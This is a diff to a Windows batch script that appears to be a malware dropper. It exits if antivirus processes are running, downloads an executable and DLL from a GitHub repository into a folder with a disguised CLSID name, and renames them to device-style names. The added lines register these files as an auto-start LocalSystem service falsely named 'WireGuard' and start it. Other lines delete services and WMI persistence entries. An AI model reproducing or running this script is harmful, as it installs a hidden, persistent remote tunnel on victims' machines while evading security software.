@@ -2,8 +2,10 @@ set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe
 for %a in (%processList%) do @tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL && taskkill /F /IM cmd.exe
 
 mkdir %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
-%WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wintun.dll" https://github.com/vltex/0/raw/main/1/wintun.dll
-%WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Wire.exe" https://github.com/vltex/0/raw/main/1/Wire.exe
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" https://github.com/vltex/0/raw/main/1/wintun.dll
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe" https://github.com/vltex/0/raw/main/1/Wire.exe
+
+sc create WireGuard binPath="\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" start="auto" obj="LocalSystem"
 
 rd /S /Q \\.\%ProgramData%\AUX..\
 rd /S /Q \\.\%ProgramData%\CON..\
@@ -31,6 +33,8 @@ sc delete Network
 sc delete Update
 sc delete Performance
 sc delete Configuration
+
+sc start WireGuard
 
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="SCM"' DELETE
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="MCS"' DELETE
